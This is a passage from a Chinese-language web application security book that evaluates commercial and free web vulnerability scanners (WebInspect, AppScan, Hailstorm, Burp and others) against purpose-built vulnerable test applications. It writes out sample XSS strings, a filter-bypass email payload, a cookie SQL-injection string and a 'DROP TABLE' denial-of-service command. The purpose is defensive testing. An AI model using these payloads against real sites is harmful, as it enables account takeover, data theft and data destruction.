<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>威胁建模</td><td style='text-align: center; word-wrap: break-word;'>威胁建模(Threat Modeling), Frank Swiderski</td><td style='text-align: center; word-wrap: break-word;'>ISBN: 0735619913</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>和 Window Snyder 著</td><td style='text-align: center; word-wrap: break-word;'>微软的威胁建模页面</td><td style='text-align: center; word-wrap: break-word;'>http://msdn.microsoft.com/security/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Microsoft.com 上的“Web 应用的威胁建模”</td><td style='text-align: center; word-wrap: break-word;'>Microsoft.com 上的“Web 应用的威胁建模”</td><td style='text-align: center; word-wrap: break-word;'>securecode/threatmodeling/ default.aspx</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>“备忘录：Web 应用安全结构”，微软对常见 Web 应用漏洞的分类系统</td><td style='text-align: center; word-wrap: break-word;'>http://msdn.microsoft.com/library/dnpag2/html/tmwa.asp</td><td style='text-align: center; word-wrap: break-word;'>default.asp?url=/library/en-us/dnpag2/html/tmwa.asp</td></tr></table>

Dana Epp 的文章 “恐惧已死”（DREAD is Dead）

微软安全响应中心 安全公告严重程度评分

系统（2002 年 11 月修订）

通用漏洞分级评价体系（CVSS）

http://silverstr.ufies.org/blog/

archives/000875.html

http://www.microsoft.com/technet/

security/bulletin/rating.mspx

http://www.first.org/cvss/cvss-guide.html

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>代码评审</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>《编写安全的代码》第二版（Writing Secure ISBN: 0735617228</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Code, 2nd Ed.) Michael Howard, David C. LeBlanc 著</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>微软的《如何对托管代码进行安全代码评 http://msdn.microsoft.com/library/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>审》</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Adam Shostack 的文章：“安全代码评审指 http://www.homeport.org/~adam/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>南”（老了点，但仍然很有用）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Apache Struts 框架</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>HTTP 响应截断</td></tr><tr><td colspan="2">二进制分析</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>开放逆向工程代码</td><td style='text-align: center; word-wrap: break-word;'>http://www.openrce.org</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Ollydbg</td><td style='text-align: center; word-wrap: break-word;'>http://www.ollydbg.de</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Ollydbg 讨论论坛</td><td style='text-align: center; word-wrap: break-word;'>http://community.reverse-engineering.net</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IDA Pro</td><td style='text-align: center; word-wrap: break-word;'>http://www.datarescue.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>模糊测试</td><td style='text-align: center; word-wrap: break-word;'>http://www.immunitysec.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Spike 模糊测试器</td><td style='text-align: center; word-wrap: break-word;'>resources-freesoftware.shtml</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>在威斯康星麦迪逊大学对应用程序可靠性进行模糊测试</td><td style='text-align: center; word-wrap: break-word;'>http://www.cs.wisc.edu/~bart/fuzz/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>David Aitel 的文章：“对安全测试进行基于模块协议分析的优势”</td><td style='text-align: center; word-wrap: break-word;'>http://www.immunitysec.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>“Shellcoder 手册：发现和利用安全漏洞”（The Shellcoder's Handbook: Discovering and Exploiting Security Holes）</td><td style='text-align: center; word-wrap: break-word;'>John Wiley &amp; Sons 出版社，ISBN：0764544683</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>“攻击软件：如何攻破代码”（Exploiting Software: How to Break Code）</td><td style='text-align: center; word-wrap: break-word;'>Addison-Wesley 出版社, ISBN 0201786958</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>McGraw 著</td><td style='text-align: center; word-wrap: break-word;'>Pearson Education, ISBN 0321194330</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>“如何突破软件安全：安全测试的高效技术”（How to Break Software Security: Effective Techniques for Security Testing）</td><td style='text-align: center; word-wrap: break-word;'>Whittaker &amp; Thompson 著</td></tr></table>

安全测试工具

Mercury 的 Interactive

SPIDynamics 的 QA inspection

http://www.mercury.com/us/

products/quality-center/

http://www.spidynamics.com/

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>安全开发生命周期（SDL）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>微软的 SDL 页面</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>task force 报告：“在软件开发生命周期中提高安全性”</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>美国国家标准与技术协会的“在信息系统开发生命周期中的安全考虑”</td></tr></table>

## 第 13 章 Web 应用安全扫描器

本章是为大中型企业的 IT 操作人员和经理而写的，指导他们将本书中的评估方法实现自动化，使其可扩展，保持一致性，并且带来一定投资回报率（Return on Investment, ROI）。本章内容既是笔者作为大型企业安全经理和顾问的工作经验总结，也是对这一版书中介绍的可用的 Web 应用安全扫描工具的一次回顾。

本章中，我们关注实时 Web 应用程序的黑盒评估程序，更精确地说，是那些针对已配置 Web 应用程序产品的漏洞扫描工具。因此，我们不考虑其他大型的自动化安全技术，像预防性工具(比如 Web 应用程序防火墙)或监视技术(比如入侵检测系统, Intrusion Detection Systems, IDS)。我们也不涉及软件开发生命周期（Software Development Lifecycle, SDLC）的技术，比如软件质量保证（QA）测试工具或者自动化源代码评审工具（可参见第 12 章）。

本章的内容围绕 IT 格言 “人员、流程和技术” 进行组织。我们将花费大部分篇幅来评审几个现成的 Web 应用程序安全扫描器，最后简要地阐述在成功的 Web 应用安全扫描器的配置中，流程和人员的职责。

### 13.1 技术：Web 应用安全扫描器

如果你是一个 IT 管理员，其任务是管理一个大中型企业中所有 Web 应用的安全，我们就不必再向你兜售自动化的诸多好处了。我们将直接切入主题，试图用下面的内容回答一个价值 64 000 美元（至少）的问题：“哪个 Web 应用程序安全扫描器是最好的？”

在评估了市场上的很多工具之后，我们确定了认为能代表 Web 应用安全自动化扫描器最佳组合的样本。表 13-1 列出了达到标准的工具，以及 2006 年 3 月时它们各自的价格。

为了提供一个比较参考，我们也对一些流行的（且免费）更适合进行手工渗透测试的“安全顾问工具箱”程序进行了一些有限的测试：

☐ N-Stalker NStealth 免费版本

○ Burp Suite 1.01

o Paros Proxy 3.2.9

○ OWASP WebScarab v20052127

o Nikto

最后，我们并行运行源代码分析/缺陷注入/Web 扫描工具来确认（或否认）扫描器所报告的结论，并了解单一的扫描器与多功能工具集的差别。我们选择的工具是 Compuware DevPartner Security Checker 2.0。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>工具</td><td style='text-align: center; word-wrap: break-word;'>价格</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Acunetix Enterprise Web$4 995（无限制版本）+ $999（维护协议）Vulnerability Scanner 3.0</td><td style='text-align: center; word-wrap: break-word;'>Cenzic Hailstorm 3.0Ecyware GreenBlue Inspector 1.5Syhunt Sandcat Suite 1.6.2.1SPI Dynamics WebInspect 5.8Watchfire AppScan 6</td><td style='text-align: center; word-wrap: break-word;'>$499（“顾问/浮动“许可证的费用）+ 许可费用的 20%（作为每年维护费用）每用户/整个网络$25 000，每年维护费用$5 000，工具集$5 000每年$15 000</td></tr></table>

上面的列表并非是对所有的 Web 应用安全扫描器一个完整的总结。遗憾的是，由于在初步测试中，仍有本书出版时不能解决的技术问题，所以无法检查 NTObjectives 的 NTOSpider。

另外要啰嗦一点的是, 一般的网络/主机漏洞扫描产品, 如 ISS, Foundstone, eEye Retina, Nessus（带 Web 插件）, NGS Typhon III 和 Qualys, 虽然它们大都添加了针对 Web 应用的基本缺陷注入类型的测试, 但我们的初步测试表明, 这些产品现在所提供的 Web 功能, 还不能与我们在这里叙述的专门的 Web 应用扫描工具相提并论。

最后，我们没有评论诸如 WhiteHat Security 提供的 Web 应用安全扫描服务（其链接请参见“参考和进一步阅读”）。我们将讨论的范围限制为这段时间内现成软件（off-the-shelf software）之间的同级比较。

#### 13.1.1 测试平台

为了构建我们的测试床，我们选择了6种现成的例样应用程序来代表广泛的应用程序功能类型，以进行从传统的网络漏洞扫描器到特定Web应用缺陷注入工具的动态扫描器的基准测试，并测试源代码自动化扫描器。我们最初选择的测试应用程序有：

- OWASP/Foundstone SiteGenerator Beta 2
- OWASP WebGoat
- Foundstone Hacme Bank 2.15
- Foundstone Hacme Bank Web Services
- Foundstone Hacme Books 2.00

要用所选的工具对这 6 种应用程序进行迅速的基准测试，所需的时间和其中的困难无从知晓。我们创建两个自己编写的测试应用程序，并对它们进行适当的配置使其具备当前 Web 应用的常见特征，包括我们在咨询工作中经常遇到的常见的、实际的安全弱点，以便于分析大量的错误、性能问题、以及虚警漏警（false positives and false negatives）。

“FlashNavXSSGen”是一个非常简单的例样程序，它代表了Flash 浏览菜单的最本质的内容。在 Flash 浏览菜单中，链接作为字符串变量——以文本保存在 Web 页面中，传递给 SWF 对象。这些菜单通向静态的 HTML 页面和动态的 ASP.NET 页面，静态 HTML 页面的目的是为了测试授权检查，而动态 ASP.NET 页面编码则代表了当今一些现成商业软件包中广泛存在的常见弱点。

第二个测试应用程序是基于 PostNuke 7.5 的内容管理和 Portal 系统，它代表了 PHP 安全的“最先进的技术”，包括“反黑客”、“安全 HTML”和“IDS”功能。我们配置 PostNuke 7.5 时，把所有的安全功能都打开，也保持其默认的弱点。然后进一步在选定的位置优化解码，并确认一些输入参数，确保对特殊标记类型和双解码的多重 XSS 攻击可以成功。

在 PostNuke（以及大多数 PHP Portal 程序）中，最严重的缺点之一是严重缺乏能保护客户浏览器代理的标准化输出编码。由于 PHP 这门实现语言同 SQL 查询一样，不能明确地指定数据/函数边界，PHP Portal 也常更容易受到 SQL 注入攻击，且大部分防范措施是基于避免 SQL 注入的。

最后，我们的测试网络是 100 Mbps 交换机，没有网络带宽负载。测试机由最新的酷睿处理器系统组成，以避免任何性能方面的问题影响结果。

#### 13.1.2 测试

我们测试的重点是，确定自动化工具在什么地方可以提供可靠的或增强的分析结果，而在哪些地方仍需要人工的参与。为实现该目的，根据一个普通的 IT 管理员对这些工具的期望，我们虚构了如下一套测试。

○ 状态：必须能够登录到应用程序中并维护会话状态。

☐ 自定义规则：必须能够区分各个用户的私人内容。

○ 授权：必须能够区分已授权访问和非授权访问。

○ XSS：测试应用程序中是否存在易受各种复杂度 XSS 攻击的漏洞。

o Flash: 扫描器是否能够探测出嵌入在测试应用中滥用的 SWF 内容。

○ SQLi：推断 SQL 注入是否可能。

Log: 检查日志，确保攻击/滥用被正确地记录下来。

☐ Top 10: 验证 “OWASP Top 10” 问题已被测试过。

○ Reporting: 提供多扫描趋势分析的报告能力。

基于这些标准，我们定义一个简单的及格/不及格（pass/fail）排名系统。该测试站在大多数使用这些工具的用户的角度，即把这些工具作为点击式（point-and-click）扫描器来使用，这一点我们通过采样主要应用程序的多个企业用户得到了验证。

为了更好地理解我们用来测试这些自动化分析工具的技术标准，我们将更仔细地审查每一个方面。

##### 状态

测试扫描器能否通过基于表单的认证登录到应用程序，并在会话中保持状态。

##### 自定义规则

这是 Web 应用扫描器和网络漏洞扫描器的区别之一。网络扫描器发现的漏洞一般与丢失路径或错误配置以及主机是否可以访问敏感信息相关。

而通过应用程序扫描器，我们还需要确定 Rob 是否可以看到 Sally 的私人信息（在我们的测试中，我们将用户内容称作“报告”）。一个扫描器可能假冒成 Rob，并获得对 Sally 报告的访问权限，但除非报告中有扫描器可以用做签名的独特内容，否则即使让扫描器把该内容标记为潜在问题都是很困难的。

该类测试是为了检查扫描器是否能够充分可定制以支持该情况。更准确地说，我们希望知道扫描器是否允许构建自定制检查来区分 Rob 和 Sally 的报告。

##### 授权

当进行检查时，扫描器是否可以区分出它是在作为授权用户还是非授权用户进行操作？它是拥有默认的功能来自动识别该问题，还是需要自定制配置呢？

##### 跨站脚本（XSS）

我们希望评估扫描器对大部分已知XSS攻击类型的检测能力,从最明显的到微妙的(绕过不堪一击的输入验证),再到复杂的(结合双重编码攻击)攻击类型。下面是三种类型的XSS攻击问题,我们已通过手工分析解决,希望也能够通过自动化解决。

明显的 XSS 测试 这类测试是为了发现最简单的 XSS 攻击类型：没有做任何输入验

证，任何常见的 XSS 字符都可以直接注入到应用程序中。我们希望扫描器能执行如下的基础 XSS 测试：

<script>alert('somethingclever');<script>
<script>alert('somethingclever');<script>user@domain.site
users@domain.site<script>alert('somethingclever');<script>

更高级的扫描器会尝试另一种策略，比如用如下内容来替代 “user” 和 “site”：

<script>alert();<script>

一些扫描器会尝试更高级别的策略，比如绕过像“>”，“>>”，“)”，“</textarea>”，“</xml>”等字符。

精细的 XSS 测试 这类测试是为了发现更精细的 XSS 变量，这些变量只进行了不充分的或片面的输入验证。我们对该类攻击的测试由一份新用户的注册表单输入构成，表单设计来以 user@domain.com 的形式提取 E-mail 地址。服务端通过一个粗略的正则表达式确认字符串来验证表单的值；如果没有提供一个合法的 E-mail 地址，表单错误不返回任何数据。验证流程只验证位于@符号之前的字符是字母和数字，以及验证字符串以合法的顶级域名后缀作为结尾（比如，.com，.net）。像下面这样的 XSS 攻击字符串是有效的：

user@')">><script>alert(<script><".com

注意 预览我们的结果，没有扫描器能用该测试检测出 XSS。

复杂的 XSS 测试 这类测试是为了发现复杂的 XSS 变量，在测试中必须攻击规范化和解码弱点，以便于识别出哪些是真正的 XSS 漏洞。我们的测试由 PHP 例样程序——开启了反黑客的 PostNuke “安全” Portal 中的漏洞参数组成（我们使用 PostNuke 版本 0.7.5，阻止了包含漏洞参数的模块）。通过手工双重编码我们的变量（首先十六进制，然后再 URL），就可以成功地在该参数中利用 XSS。我们的手动攻击非常可靠，而且能够直接在 URI 中传递（即使已经被浏览器格式化），或者嵌入到一个 HTML 表单中，或者由恶意钓鱼者在一封诱人的 HTML E-mail 发送。我们认为这为扫描器提供了一个具有挑战性的测试，但同时也具有实用性，因为它的确在现成软件如 PostNuke 中存在。

注意 大部分扫描器都不能检测出这类型 XSS，也不能检测出基于攻击字符串元素的部分编码的变量，也不能使用特殊的 HTML 标记，比如体元素和背景标记。

##### Flash

这类测试设法确定扫描器能否检测出嵌入在测试应用程序中可被滥用的 Flash 内容。

我们创建了多种 SWF 文件类型以代表使用 Flash 浏览的菜单：一个基本的平板型 SWF 和一个树型的可扩展 SWF。这两种 SWF 文件在我们的测试应用程序中所接收到的链接，都是通过传递给 SWF 浏览按钮动作、作为初始化变量嵌入到 Web 页面中的相对路径而得到的。这是最容易测试的 SWF，因为路径保存在 Web 页面的文本中，在页面源码中非常容易通过变量和链接识别出来，如下所示：

<EMBED
src="xssmenu.swf?tarframe=self&exbackground=000000&makenavfield0=Page1.aspx&makenavfield2=Page2&makenavur12=/pages/page2.htm&makenavfi4=/pages/page3.htm&makenavfield5=Page3&makenavur15=/pages/page3.aspx&makenavur17=/pages/page4.aspx" loop=false menu=false quality=high scal

还有一些我们没有测试的 SWF 文件接受输入的其他方法，包括 SWF 文件自身的硬编码，以及从其他 SWF 或服务端代码中接收输入。后者最难测试，因为 SWF 是一个沙箱，攻击者必须监听 SWF 创建的链接，以观察它从那里获得的数据。

注意 只有一个扫描器（Acunetix）真正发现了我们的测试 SWF，但并不能有效地将它们解析为输入漏洞。

SQL 注入（SQLi）

对这些测试，我们使用所谓的“盲”SQL注入。在这里拒绝给攻击者提供详细的SQL错误消息。如微软经典的OLEDB错误——它会指出详细的语法问题（我们喜欢将其称为“黑客调试器”），而这些语法问题经常被入侵者利用，以构建进一步的攻击。我们创建了两种测试方案，以分析自动化扫描器在我们Web应用中识别盲SQL注入的能力，这两种方案都是基于MSSQL Server 2000的。

注意 不是所有的“盲”SQL注入都是一样的；其中一些类型可以被自动化扫描器检测出。

使用存储过程进行 SQL 注入 在第一种方案中，我们使用一个存储过程来（sproc）完成 Web 应用的登录功能。Web 应用登录表单提取用户 ID 和密码，并传递给存储过程，然后存储过程执行一个比较函数，与数据库中的值进行比较，以确定用户名和密码是否合法。

该存储过程故意使用动态 SQL 查询来提取直接的、未经过滤的用户提供的用户 ID 和密码数据，并构建一个连接字符串作为一个查询来执行。攻击这样的连接变量相当简单，就像在第 7 章中演示的那样，注入常见的字符（'，--等等）就可以执行攻击。

我们选择该漏洞是因为它在实际应用程序中非常常见，特别是“隐匿实现安全”的观念，使得开发者会假定存储过程是“更安全”的。在服务器端代码中执行的动态查询也有同样的问题，而且开发者经常假定只要禁用错误消息就能阻止攻击。这些手段都是无效的，特别是当攻击者是近期被解雇的编写查询的开发人员时，他能写出执行这样的攻击的查询

语句。

使用触发器进行 SQL 注入 第二个 SQL 注入测试方案有一点复杂。我们创建了一个 SQL 触发器，把它放在一个叫做 “IPOMagic_users” 的表中，该表包含了敏感的用户数据（比如，信用卡号码和社会保险号码，SSN）。该触发器的目的是限制对信用卡或 SSN 字段的访问。只要有进程尝试对 IPOMagic_user 表进行创建、读取、更新或删除（CRUD）查询时，触发器就会执行一个查询，请求用户会话对象（在我们的测试应用中是一个会话 Cookie），然后再执行一个针对会话数据库的动态查询，验证在允许该进程以该用户名义对表执行动作前，Cookie 就存在了。这里假设如果一个请求没有对应的合法会话 Cookie，那么就可能是一个恶意的攻击者正在尝试滥用系统。

为了了解现实中的危险，考虑一个假想的恶意攻击者：t0rn@d0，他不是系统的合法用户，因此没有合法的会话 Cookie 来访问该表。但是，t0rn@d0 不用向应用提供一个合法的会话 Cookie。通过如下的语法，他可以轻松地为自己创建一个新 Cookie，并将其注入到表中：

Cookie=sessionID=13AEDF' OR ('1'='1

（注意，这里假设应用程序会因为该查询函数而接受来自用户的任意会话 Cookie 值）。现在，当 IPOMagic_users 触发器开始评估 t0rn@d0 是否有对敏感数据的合法访问权时，t0rn@d0 注入的 Cookie 语法会被解析而返回“真”，导致安全触发器在会话数据库中取出它遇见的第一个 Cookie，并告诉应用程序我们的这位攻击者是良民。IPOMagic 的敏感数据则正式由 t0rn@d0 接管了。

注意 在以上两种情况中，我们可以执行一个简单的攻击，在例样应用程序上进行系统范围的拒绝服务 “DROP TABLE IPOMagic_Users ;--”

我们的 SQL 注入触发器测试方案多少有点人为因素，因为触发器很少依赖用户提供的数据，但 SQL 领域的安全大多被忽略了。直到 2003，市场上才有数据库“安全”产品，而其完全依赖触发器操作，某些情况下还在过高权限级别上使用数据（诸如 Cookie/会话令牌），这使得恶意攻击者轻易地通过 SQL 语法替换数据。

注意 感谢 NGS Software 的 David Litchfield，他帮助评估了一些触发器测试中 SQL 注入的影响。

#### 日志分析

扫描器能够分析日志发现攻击或 Web 应用安全测试的其他相关错误吗？

Top-10

扫描器的测试范围是否至少覆盖了在 OWASP Top-10 中描述的基本默认漏洞(OWASP

站点的链接请参见“参考和进一步阅读”）呢？

##### 报告

扫描器是否提供非一次性的报告，这些报告能否对一段时间内的结果做比较和趋势分析？这些结果是否不仅包含了对安全测试人员有用的信息，还包含了对开发者的建议？还有，描述发现的漏洞时，是否使用了被广泛接受的标准如 OWASP Top-10，或者 WASC 攻击分类学（参见“参考和进一步阅读”），亦或是二者并用呢？

#### 13.1.3 单个扫描器评审

现在让我们看看在该评估中每个工具产生的结果。每个分析工具都有其强项和弱项，这里我们重点演示一些来自各工具的更有趣的结果（很多工具都产生了相似的结果，但我们选择这些例样的原因是更喜欢 GUI 及其独特性，尽管从 GUI 中能看到过多个相似的结果）。

##### Acunetix Enterprise Web 漏洞扫描器（WVS）3.0

我们发现 WVS 有很多吸引人的功能，比如可以查看和编辑（自定义）所进行的所有检查，也包含一个模糊测试器尝试暴力破解参数值——这是一个明显需要自动化的任务。

AcunetixWVS 也是唯一可以枚举我们指向的所有 SWF 的扫描器（但它需要一些手动的交互来完成该过程）。但是，它不能检测出常见的命名页面或 XSS 攻击。

图 13-1 显示了一个 WVS 测试的页面列表。注意它跳过了应用程序的页面 2 到页面 4，没有检测出任何我们植入的用于测试的 XSS 漏洞。图 13-1 还说明，我们把 WVS 作为一个代理，能够通过浏览器手动利用 XSS 实施攻击。

 </div>

##### Cenzic Hailstorm 3.0

我们从世纪之交的 2000 年就开始用 Cenzic 工作（哇，这样说来我们很古老了!），当时发布了第一代协议模糊测试工具。因此，使用第三代 Hailstorm 3.0 我们自然很激动，而且在很多方面，该工具达到了我们的期望。原来的性能问题和默认检测的不足有了很大的改善。Hailstorm 在爬行 Web 应用（称为“遍历”）和应用安全测试（称为“智能攻击”）之间提供了一个逻辑隔离。有多种遍历类型，逻辑组织形式比我们分析的其他任何工具都好。

关于 Hailstorm，我们喜欢的最重要的单项功能是，它能够控制并调整测试提供的大量配置。Hailstorm 的图形用户接口（Graphical User Interface，GUI）用直观的方法让我们识别遍历过程中枚举的参数，可将它们篡改以适合我们 XSS 攻击的需要。图 13-2 说明了这个强大的功能。

不足的是，我们发现 Hailstorm 的默认 XSS 检查没有我们所希望的那么广泛（当然，我们可以利用默认检测的易扩展性、花费一些手工操作来克服这个问题）。我们还发现一些 GUI 的问题，不是非常的直观，但与 Hailstorm 提供的整个功能相比，这些都是很小的问题。

 </div>

##### Ecyware GreenBlue Inspector 1.5

相对于本次比较中的其他扫描器，Ecyware GreenBlue Inspector 的默认配置提供了有限的自动化功能。虽然它能够定义单元测试，并对一些特殊的应用进行自动化检查，但是当

涉及到整体的自定制功能集时，还是缺乏像其他工具的易用性和功能性。

在手动测试中，GreenBlue Inspector 的确非常出色。该工具给我们留下了很深的印象，包括美观性、方便性和高实用性的用户接口。我们只需点击一次鼠标，就可以完成很多其他扫描器需要点击多次才能完成的工作：启动另外的一个工具，输入攻击代码，然后在一个格式很差的窗口中观看结果。因此，对于执行精细的手动工作的 Web 应用安全渗透测试人员，我们强烈推荐使用 GreenBlue Inspector。图 13-3 显示了 GreenBlue Inspector 正在启动一个 XSS 攻击，来验证开发者没有在他们的表单上强制 POST 提交，这样我们就能注入 XSS 到 E-mail 超链接中，进行 CSRF/利用已有会话的攻击。

 </div>

Syhunt Sandcat Suite 1.6.2.1

Syhunt 的 Sandcat Suite 是 Web 应用安全扫描器市场的新兵。它采取安全扫描器经典的“暴力”方法，提供了一个大的“已知文件”和“已知漏洞 Web 应用”的特征检查数据库。它也能够执行自定义的缺陷注入测试，虽然该类测试大多仅能执行 URI 参数操纵。

我们喜欢 Sandcat 用户模式的 GUI 以及易用性，但是在测试中，我们发现它是所测试的工具中最慢的。而且其他工具可以发现的很多漏洞，它都发现不了。虽然我们与该产品的开发团队有非常积极的合作体验，但 Sandcat Suite 只是一个 1.x 的版本，目前我们只推荐使用它对应用程序做最基础的、不需要状态认证或高级测试的尽职检查（due-diligence check）。

我们发现在这次评审中只有一个产品（N-Stalker）具有 Sandcat Suite 的一些功能：Web 服务器日志分析和 Web 服务器配置加固。通过 Web 应用安全评估工具能明显地加固 Web 服务器配置，但是我们不能确信日志分析的功能，直到我们在本书其中一个作者的个人 Web 服务器上尝试了该功能。该 Web 服务器在 Internet 上，装载了一些应用程序，其分析结果如图 13-4 所示。

 </div>

由于 Sandcat 具有测试攻击数据库，它可以在我们的 Web 服务器日志中快速检测类似的攻击模式。事实上，它迅速地揭示了我们自己的 Web 日志上的重要特征：

○ 可以看到我们从一个安全点登录和登录失败。

可以看到全世界的有如此多的人在“测试”我们。

- 可以迅速地识别笔者的哪位朋友 “验证” 过我们的测试应用程序的安全机制（很好的尝试……）

就像你看到的一样,这些是集成到一个自动化 Web 应用评估工具中的非常有用的信息。

SPI Dynamics WebInspect 5.8

SPI Dynamics 是最先创建自动化 Web 应用评估工具的厂商之一，并且拥有该领域最成熟和最有用的工具。

注意 免责声明——虽然 SPI Dynamics 的创办者是本书的合作者,但是他并没有涉及本章中描述的测试和分析。

WebInspect 从它第一次发布以来已经有了长足的发展，它的 5.8 版本是在我们测试阵容中功能最齐全的工具之一。它在我们进行的大多数 XSS 类型测试中遥遥领先，紧随其后

的是 Watchfire。WebInspect 内带的手动测试工具包是最好用的工具包之一。如果我们还有什么抱怨，那就是该工具没有很好的集成，以及缺乏在某些情况下从已保存的文件导入和导出数据的能力。图 13-5 显示了 WebInspect 的手动工具包在我们的 XSSGen 应用上验证一个 XSS 攻击。

虽然 WebInspect 在自动化扫描中有着重要优势：有配置自定制检查的一些最佳向导，以及有做复杂的自定制检查的强有力框架，我们仍然在测试中发现了一些微小的不足。

举个例子，虽然 WebInspect 一开始能很好地生成新的自定义检查，但是它不能让我们深入到底层来调整已经存在的检查。如果你不能查看预先提供的测试，你怎么知道是否需要编写一个自定制的测试呢？缺乏可见性（visibility）这一点让人有些扫兴。

另一个让人扫兴的地方是，WebInspect 无法灵活地调度安排时间。虽然类似 Hailstorm 这样的工具允许你用各种方法爬行一个应用程序，并且可以安排晚一点的爬行测试（甚至用新的会话令牌指定一次“重爬行”），但是 WebInspect 给我们全是-全否（all-or-nothing）的选择。即要么指定一个完全自动化的爬行和测试，要么完全手动地执行。Web 应用产品只能在有限的维护窗口过程中扫描是一个不现实的限制。在理想情况下，你可以在白天爬行应用程序，并构建在维护窗口过程中每月运行一次的测试，但是使用 WebInspect，你需要准备大量的咖啡，然后在深夜返回你的办公室。

 </div>

##### Watchfire AppScan 6

啊，我们仍清楚地记得在 20 世纪 90 年代末，小小的 Perfecto Technologie 公司创作了

世界上第一个 Web 应用安全扫描器，甚至在改名（2000 年改为 Sanctum）和被收购（2004 年被 Watchfire 收购）后，AppScan 仍是市场上领先的 Web 应用安全评估工具之一。

像对 WebInspect 一样，我们对 AppScan 有很多顶级褒奖。AppScan 之所以能鹤立鸡群有几方面的原因：它是我们的测试工具中，唯一可以准确识别出存在扩展 UTF-8 编码的 XSS 攻击漏洞的工具；它也是市场上具备最先进的 JavaScript 解析功能的工具（和 WebInspect 相当）。在我们的报告/分析测试中，AppScan 是具备最顶级的性能工具之一。

另外，虽然 AppScan 和所有我们比较过的工具一样，会产生虚警（false positives），但其产生的虚警比大部分自动化工具要少得多。AppScan 也是检测 XSS 的最好工具之一，在我们“复杂”PostNuke XSS 测试中，它是唯一正确的识别出漏洞参数的工具，如图 13-6 所示。

 </div>

我们对 AppScan 的确有一些抱怨。默认爬行配置有时太严格了，爬行动态应用程序有时像是进入了无限循环一样。当然，这是有两面性的：不管其测试性能如何，在我们测试中，AppScan 是多次唯一自动发现我们测试应用中某些页面的工具，

我们同样挑选 AppScan（可能有点不公平）来说明安全扫描产业存在过热营销的整体倾向。像很多其他厂商一样，AppScan 有时候在产品功能实现之前，就在市场上以该功能为卖点。举个例子来说，AppScan 宣称可以解析 Macromedia Flash，但对我们来说，我们尝试了所有的办法，自动的、手动的、或者把它作为代理使用，都无法用 AppScan 解析 SWF 文件，如图 13-7 所示。

#### 参考工具

如前面提到的，为了提供一个参考比较，我们也用一些流行（并且免费的）“安全咨询工具箱”程序进行了一些有限的测试，这些程序更适合手动渗透测试。

我们也在测试组中运行 Compuware DevPartner SecurityChecker 2.0。SecurityChecker 是一个源代码分析/缺陷注入/Web 扫描工具集，我们对它与单纯的扫描器的性能比较结果很感兴趣。

以下是对这些工具的一些看法。

 </div>

N-Stalker N-Stealth5.8（免费版） N-Stealth 的历史比我们分析的很多商业工具都更久远，很多漏洞分析小组都对它有很好的评价。N-Stealth 的强项是可以迅速发现已知的 CGI 脚本和文件漏洞，以及常见的 Web 服务器配置问题。图 13-8 显示了 NStealth 的 HTML 报告格式。

 </div>

但是，N-Stealth 缺乏实际注入诸如 XSS 或 SQL 攻击到应用中并分析响应的能力，因此它不能在新应用程序中发现以前的未知漏洞。由于 N-Stealth 这种检查“已知文件”特性，我们发现它会产生很多虚警和无关的结果。

Burp Suite 1.01 Burp Suite 是鲜为人知的一种工具集，包括了网络蜘蛛、代理和一些手动测试工具。Burp 缺乏深入检查和自动化的功能，因此不能把它归到本节中其他工具所在的任何一类，但是把它放在这是因为它作为底层的手动渗透测试工具，有特别的价值。在所有已评估工具中，Burp 的设计人员显然深刻理解了测试复杂 Web 应用程序的种种细微差别，对那些需要高效地从其 Web 应用中苦苦寻觅出每一丁点复杂安全漏洞的人来说，Burp 以最吸引人的方式展现了其功能。

比如, Burp 的模糊测试提供了大量的载荷配置和发送选项。图 13-9 显示了 Burp Intruder 在同时用多个参数测试一个常见 Web 应用。

 </div>

我们希望商业扫描工具的厂商能把该层次的检查粒度构建到它们的参数检测中。我们可以给出很多例子，说明我们是如何幸运地偶然发现三个或更多大参数的不可思议的组合值，正是这些参数使我们成为控制者。Burp Intruder帮助我们在大型应用程序中高效地发现输入验证漏洞，从而节省了大量的时间。

Compuware DevPartner Security Checker 2.0 越来越多的多功能 Web 安全工具包在 404

出现，它们将黑盒远程扫描功能与集成 QA 验证、以及源代码分析能力的开发环境结合在一起。事实上，SPIDynamics 的 DevInspect 提供了类似功能。虽然该产品多少有点偏离本章中关注的 IT 业务，但我们认为如果在测试中运行它，并把得到的结果与单纯的扫描器结果相比较，应该很有意思。

我们决定测试第三方产品，而不是重复测试像 SPIDynamics 那样提供多种功能其他产品。Compuware 在软件开发世界里非常知名，它为软件开发者提供了很多提高效率的工具。最近，Compuware 完成了它们进入软件安全领域的第一个产品：DevPartner Security Checker。

